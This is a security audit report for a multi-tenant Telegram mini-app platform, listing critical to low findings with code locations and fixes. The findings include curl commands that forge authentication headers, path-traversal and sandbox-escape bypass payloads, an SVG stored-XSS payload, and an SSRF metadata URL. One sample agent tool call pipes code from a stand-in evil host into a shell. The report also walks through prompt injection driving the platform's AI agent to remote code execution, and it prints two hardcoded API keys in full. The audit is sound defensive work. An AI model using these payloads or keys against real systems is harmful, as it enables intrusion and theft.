Security Audit — Apps Father
Executive summary
Most of the worker isolation and per-tenant filesystem story is sound — the recent allowlist + frontend-to-/srv work fixes the biggest of the previously-known issues. The remaining critical and high-severity findings cluster into five families, fixing which closes ~80% of the actual exploit paths. I've ordered the report by exploitability × blast-radius, not by finding count.

🟥 CRITICAL — Fix today
C1. Bot tokens (and pre-decryption ciphertext) logged to stdout
src/web/middleware/initdata.ts:40-52,55,95 — every request to a verified /api/:projectId/... route prints:

checking encrypted bot token
<encryptedBlob>          ← line 41
<DECRYPTED PLAINTEXT BOT TOKEN>   ← line 50
<computedHmac> === <providedHmac> true|false   ← line 95
[InitData] Hash mismatch ... — allowing with unverified user   ← line 55 (also lies — it 401s)
Attack: anyone with PM2 logs / journalctl / log shipper / OpenPanel access reads every project's bot token in plaintext. With the bot token, attacker forges arbitrary Telegram user identity against any project, calls setWebhook, hijacks the bot. Fix: delete every console.log in this file. Do it before reading any further.

C2. /devapi/* skips HMAC verification entirely; trusts client-supplied initData
src/web/middleware/initdata.ts:32-36 + src/web/routes/devapi.routes.ts:159-203

if (req.originalUrl?.includes("/devapi/")) { next(); return; }
After the skip, req.telegramUser is filled from the unverified user field of the initData. Even worse, devapi.routes.ts has a "visual-test resign" path that re-signs an attacker-chosen user with the project's real bot token, producing valid initData for any user id. /devapi is reachable from the public internet on the same hostname as /api. Attack: curl -H "X-Telegram-Init-Data: user=%7B%22id%22%3A1%7D&hash=x" https://app.apps-father.com/devapi/<projectId>/whatever → req.telegramUser = {id: 1} → user 1 impersonated against the dev runtime. Fix: require HMAC on /devapi whenever the project has a bot token, OR gate /devapi behind admin auth / VPN / localhost-only listener.

C3. Worker trusts client-supplied X-Telegram-User header
src/web/routes/runner-proxy.ts:98-103,127-133 — proxy only adds the header if req.telegramUser was set by upstream middleware. It does not strip an inbound header with the same name before forwarding all req.headers to the worker. runner/worker-entry.js:246-255 then base64-decodes the header and assigns it to req.telegramUser for routes.js. Attack: any unauthenticated request curl -H 'x-telegram-user: <base64({"id":1})>' https://app.apps-father.com/api/<projectId>/whatever → routes.js sees req.telegramUser = {id: 1}. Combined with C2, even cleaner. Fix: in forwardHttp, blacklist x-telegram-user and x-telegram-init-data when copying inbound headers; only the value derived from verified middleware may pass.

C4. Path traversal via :projectId on user-facing routes
Multiple routes do path.join(PROJECTS_DIR, req.params.projectId, …) with no UUID validation:

src/web/routes/api.routes.ts:131-137
src/web/routes/devapi.routes.ts:135-142
src/web/ws-manager.ts:78-82
src/web/server.ts:4721-4724 (/telegram-mini-app/api/avatar/:projectId)
src/web/server.ts:5050-5063 (chat upload — see C5)
Attack: req.params.projectId = "../<other-project-id>" → routes.js of another tenant gets required and run in the main process, with full root privileges and access to the platform postgres. Fix: put a UUID-anchored validator at the top of every :projectId handler:

const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
if (!UUID_RE.test(projectId)) return res.status(400).json({error:"bad id"});
The runner-proxy already does this (runner-proxy.ts:54-58); copy that.

C5. Chat upload writes attacker-named files anywhere under cwd
src/web/server.ts:5045-5063 — path.join(assetsDir, f.originalname) + fs.renameSync(f.path, dest). f.originalname is fully attacker-controlled. Attack: authenticated project owner uploads originalname = "../../<other-project>/development/backend/routes.js" → overwrites another tenant's deployed routes (which then runs in the main process under in-process mode, in their worker under worker mode). Even originalname = "../../../../etc/cron.d/x" if the platform user can write there. Fix: ignore originalname for the destination — generate ${randomUUID()}${path.extname(safeBase)} where safeBase = path.basename(originalname). Validate the resolved destination starts with assetsDir + path.sep.

C6. Hardcoded third-party API keys committed to repo
src/config.ts:39-41

elevenLabsApiKey: process.env.ELEVENLABS_API_KEY || "sk_d8d1894ac4e643e5c4aa20e97649837f96d62408da2e96e2",
apiPassKey:       process.env.APIPASS_KEY       || "apk_47d643e413f208561ea96fca31692455e1b6745c1ccab4ce9873ca8cd67250bf",
Attack: these are in git history. Anyone with read access to the repo (incl. previous employees, leaked credentials, GitHub org members) can drain the ElevenLabs and ApiPass quotas, run up bills, generate content under your accounts. Fix: rotate both keys now, set env vars only, replace defaults with "", run git log -p src/config.ts | grep -E "sk_|apk_" and consider history rewrite.

C7. NOWPayments IPN HMAC silently skipped when secret unset
src/services/billing.service.ts:769-779 — if config.nowpaymentsIpnSecret is empty (which is the default in config.ts:30), the HMAC check is bypassed and any POST to the IPN URL credits the user matching order_id. Attack: attacker POSTs a fake "finished" IPN with order_id = <pendingPaymentId> → balance credited. Fix: fail closed. If config.nodeEnv === "production" and nowpaymentsIpnSecret is empty, throw at startup.

C8. Default admin password is "admin"
src/config.ts:31 — adminPassword: process.env.ADMIN_PASSWORD || "admin". Attack: any host where ADMIN_PASSWORD is unset → POST /admin/api/login {"password":"admin"} → full admin token → balance manipulation, project takeover, voucher creation, withdraw retry. Fix: fail startup if env var is missing in production. No default.

🟧 HIGH — Fix this week
H1. Webhook payment confirmation races (double-credit)
src/web/routes/billing.routes.ts:69-102 (CryptoBot)
src/services/billing.service.ts:645-675,788-827 (NOWPayments + TON)
src/services/ton-monitor.service.ts:234-257 (TON top-up)
All four follow the same anti-pattern: findUnique → check status === "pending" → $transaction([create ledger, update balance, update status]). Two concurrent webhook deliveries (Telegram and TON indexers retry aggressively) can both pass the read and both credit. Fix: make the status flip the gate — prisma.payment.updateMany({ where: { id, status: "pending" }, data: { status: "confirmed" } }) and only credit if count === 1. Add a UNIQUE constraint on ton_topups.tx_hash and payments.external_invoice_id.

H2. Withdrawal target address not bound to wallet ownership proof
src/web/server.ts:4200-4247 — tonAddress comes from req.body. There's no TonConnect signature, no "address must equal a previously-verified one", no admin review for first-withdraw-to-new-address. Attack: session-token theft (XSS, mini-app vulnerability, devtools in stolen device) → attacker calls withdraw with their own address → balance drained. Fix: require a signed TonConnect proof for the target address, OR pin the destination to the address used on the user's last verified top-up.

H3. Concurrent withdrawals can over-spend balance
src/web/server.ts:4219-4244 — read balance, then $transaction([create withdrawal, decrement]) without WHERE balance >= amount. Fix: prisma.user.updateMany({ where: { id, tonBalance: { gte: amount } }, data: { tonBalance: { decrement: amount } } }) and check count === 1 before creating the withdrawal row.

H4. deploy.ps1 runs npm install without --ignore-scripts
deploy.ps1:277 — npm install --omit=dev --no-audit --no-fund. The runner-side allowlist scanner correctly uses --ignore-scripts, but the platform's own install on every deploy doesn't. Attack: any compromised dependency in package.json (transitive too) executes its postinstall as the deploying user (root in your setup). Fix: npm install --omit=dev --ignore-scripts --no-audit --no-fund. Re-deploy with this flag set ASAP.

H5. Symlink-following file copy from user-writable tree to /srv (and back to web)
src/services/commit.service.ts:14-25 (copyDirSync uses copyFileSync which follows source symlinks). src/web/routes/app.routes.ts:50-58 + dev.routes.ts:87-96 use path.resolve containment but not realpath, so a symlink under /srv/.../<id>/<runtime>/frontend/ is followed by res.sendFile / fs.readFileSync. Attack: project owner (or compromised agent) writes frontend/leak.txt → /etc/shadow in their commit; deploy_to_dev syncs the symlink to /srv (root-owned operation, so it can read shadow); subsequent GET /dev/<id>/leak.txt reads /etc/shadow and returns it. Fix:

In copyDirSync: use fs.cpSync(src, dest, { recursive: true, dereference: false, errorOnExist: false, verbatimSymlinks: true }), OR lstat each entry and skip / refuse symlinks.
In app.routes.ts / dev.routes.ts: fs.lstatSync(fullPath) and refuse if isSymbolicLink(), or use fs.realpathSync and re-check containment on the real path.
H6. Security validator regex bypasses
src/services/agent/security-validator.ts:218-224, single-line regex on the source.

Lines starting with /* are entirely skipped — /* ok */ require('child_process') slips through.
Multi-line statements are never matched: a require(\n'child_process'\n) evades.
Dynamic forms evade trivially: require(['child','process'].join('_')), import('child_process'), module.constructor._load('child_process').
Only backend/routes.js is scanned; helper files in backend/ are unchecked (validation.ts:234-245).
Attack: sandbox escape. The user's worker runs as afp_*, so child_process gets that user's privileges — but it can spawn shells, read /etc/passwd, exhaust the worker's heap, and depending on configuration access the SQLite db of release runtime from dev runtime. Fix: AST-based check (parse with acorn, walk for CallExpressions whose callee is require/import, plus MemberExpression access to module.constructor._load, process.binding, etc.). Scan backend/**/*.js not just routes.js.

H7. grep agent tool is shell-injectable
src/services/agent/tools/impl/filesystem/GrepTool.ts:48-54 — builds a string passed to exec (= sh -c), with only " escaped. $(...) and backticks in the regex run as shell commands as the main app process user (root). Attack: prompt injection from chat → agent emits grep({pattern: "$(curl evil.tld | sh)", ...}) → root RCE on the platform. Fix: remove the shell. Use execFile("rg", [pattern, "-n", ...flags, dir], {...}) with argv array, or replace with the existing Grep/ripgrep tool API.

H8. fetch_url agent tool has no SSRF protection
src/services/agent/tools/impl/filesystem/FetchUrlTool.ts:26-52 — only blocks the localhost APP base URL. No filtering of 127.0.0.1, 169.254.169.254, 10.0.0.0/8, 192.168.0.0/16, IPv6 link-local, internal hostnames. Follows redirects unconditionally; no body-size cap before reading the whole response into memory. Attack: prompt-inject the agent into fetch_url("http://169.254.169.254/latest/meta-data/iam/security-credentials/") to dump cloud metadata, or http://internal-postgres:5432/. Fix: parse URL, resolve DNS, reject if the resolved IP is in any private/link-local range. Cap redirects to 0–3, total body to 1–2 MB, total time to 15s. Optionally HTTPS-only.

H9. Worker's process.env is not fully scrubbed
runner/worker-entry.js:64-67 deletes RUNNER_SECRET, AF_INTERNAL_SECRET, BOT_TOKEN. BOT_USERNAME remains. Also PROJECT_ID, PROJECT_ROOT, BASE_URL, RELEASE_DB_PATH, etc. — useful metadata that user code probably should not have casual access to, even though they're not secrets. Fix: capture every needed env var into local consts at the top, then for (const k of Object.keys(process.env)) delete process.env[k]; then Object.freeze(process.env).

H10. Telegram webhook secret not enforced (verify)
src/services/bot-runner.service.ts:261,276-278 + src/index.ts:90-95 — Telegram's setWebhook is given a secret_token, but the audit could not confirm Grammy's webhookCallback(bot, "express") enforces the X-Telegram-Bot-Api-Secret-Token header on incoming POSTs without an explicit option. Attack (if not enforced): attacker discovers /webhook/<16-hex> (which is hash-of-token, not a secret) → POSTs arbitrary Telegram update objects → bot bridge dispatches them as if they were real user messages. Combined with payment-via-stars or balance-affecting bot commands, exploitable. Fix: explicitly verify the header in your route or pass Grammy the option. Verify behavior in your installed Grammy version this week.

H11. Per-project Linux username hash truncation
src/services/runner-provision.service.ts:33-35 — 10 hex chars = 40 bits. Birthday-collision probability at 1 000 projects is ≈ 4.5 × 10⁻⁷, not 10⁻⁸ as the comment claims; at 10 000 it's ≈ 4.5 × 10⁻⁵. A collision merges two tenants under one UID — total isolation breach for those two. Severity caveat: projects ids are server-generated UUIDs, so no attacker pre-image. This is an availability / silent-corruption risk, not an active attack. Fix: widen to 16 hex chars (64 bits, ≈ 5 × 10⁻¹⁵ at 10k) or maintain a username column with retry-on-conflict.

🟨 MEDIUM — Fix this month
M1. SVG uploads served as image/svg+xml from app origin = stored XSS
src/web/routes/bucket.routes.ts:44,170-178 — image/svg+xml is in MIME_TO_EXT. Owner uploads <svg onload="fetch('/admin/api/users')">…</svg>, then embeds the URL in their app. If anyone (admin, other users) opens the URL directly or in <object> / <iframe>, JS runs against your origin. Fix: disallow SVG, or sanitize, or serve uploads from a separate cookie-less origin (bucket.apps-father.com) and Content-Disposition: attachment.

M2. Internal secret comparisons not constant-time
src/web/routes/bucket.routes.ts:100 (x-af-internal === config.internalSecret)
src/web/routes/admin.routes.ts:71-72 (admin password)
src/web/middleware/initdata.ts:96 (HMAC hex compare)
src/web/routes/billing.routes.ts:40-42 (CryptoBot HMAC)
Fix: use crypto.timingSafeEqual on equal-length buffers everywhere.

M3. No auth_date freshness check on initData
src/web/middleware/initdata.ts:74-99 — if a stolen initData blob is replayed days later it still validates. Fix: reject if auth_date is older than ~24 h.

M4. Admin token in query string for downloads
src/web/routes/admin.routes.ts:56-60 — ?token=… for ZIP downloads. Tokens leak through Referer, browser history, server access logs. Fix: issue short-lived single-use download tokens via POST /admin/api/projects/:id/download/prepare → returns one-shot URL that expires in 60 s.

M5. Admin file-browser containment uses includes("..") not path.resolve
src/web/routes/admin.routes.ts:333-357,1622-1634 — admin endpoint relies on string-includes for traversal protection. Symlinks under development/ are followed. Fix: path.resolve containment + reject symlinks.

M6. Bucket — no per-project storage quota
src/web/routes/bucket.routes.ts — owner can upload 50 MB at a time, no aggregate cap → trivial disk-fill DoS. Fix: track total bytes per project; enforce a soft limit and reject above hard limit.

M7. WebSocket projectId regex weaker than HTTP
src/web/routes/runner-proxy.ts:261-272 — /^\/app\/([a-f0-9-]+)\/ws/ allows any hex+dash string, not a strict UUID. HTTP path uses the strict version. Inconsistent contract. Fix: reuse the same UUID validator.

M8. Bot token encryption uses CryptoJS AES with passphrase
src/services/crypto.service.ts:4-11 — CryptoJS's salted format works, but:

No AEAD (no integrity protection — bit-flip attacks on stored ciphertext are silent).
Key strength derives from ENCRYPTION_KEY string entropy, not a KDF you control.
Fix: migrate to crypto.createCipheriv("aes-256-gcm", ...) with random IV per encrypt and key versioning (so rotation doesn't need a full re-encryption sweep).

M9. Voucher multi-use redeem race
src/bot/commands/start.ts:109-134 — usedCount < maxUses checked outside the increment. For maxUses > 1, parallel redeems by different users can overshoot the cap. Fix: conditional updateMany({ where: { id, usedCount: { lt: maxUses } }, data: { usedCount: { increment: 1 } } }) and check rowcount.

M10. AMM pending trades — quote vs settlement price drift
src/services/liquidity-amm.service.ts:265-344 + ton-monitor.service.ts:436-442 — quote shown to user is for the curve at time T0; settlement applies the curve at T1. If pool moves while payment confirms, user gets a different amount than displayed. Fix: persist expectedTokensOut + slippageBps in the trade row; on settlement, refund or refuse if observed amount falls outside tolerance.

M11. Admin balance changes have no audit ledger
src/services/admin-queries.service.ts:255-266 — setUserBalance touches tonBalance directly. setUserCredits writes a balance_ledger row, but USD/TON balance does not. Fix: mirror setUserCredits' pattern, append an admin_audit row on every mutation.

M12. Internal secrets random on each boot when env unset
src/config.ts:7-11 — _internalSecret and _runnerSecret regenerate on every start. If main process restarts but a long-lived worker doesn't, internal auth breaks silently. PM2 cluster mode would also fail. Fix: require explicit env vars in production; fail startup if missing.

M13. WEBHOOK_SECRET defaults to "default-secret"
src/config.ts:27 — used by Telegram webhook AND the log viewer (logs.routes.ts). Fix: require explicit value in production.

🟩 LOW — Hardening backlog
L1. Replace helmet-less Express stack with helmet({contentSecurityPolicy: …}). No CSP, no X-Frame-Options on the admin SPA → admin clickjacking possible (src/web/server.ts:171+).
L2. Agent ImageGenerateTool forwards arbitrary user-controlled prompts to the upstream image API — exfiltration channel for whatever fits in the prompt context.
L3. Worker port pool exhaustion if many tenants spawn concurrently (runner-manager.service.ts:626-661).
L4. ListFilesTool reads whole files for line counts — performance/secret-amplification concern on large projects.
L5. read_file agent tool has no deny-list for backend/.env — if users keep secrets there, they end up in LLM context windows.
L6. EXIF metadata not stripped from uploaded photos (privacy, not security).
L7. error-report/:projectId endpoint at src/web/server.ts:1554 is unauthenticated → spam.
L8. Stars payment handler doesn't verify ctx.from.id === payment.user.telegramId (src/bot/index.ts:43-49).
L9. Telegram webhook hash truncated to 64 bits — collision space exists but no attacker control.
L10. npm-scan.sh only inspects routes.js (helper-file packages slip through; aligned with H6).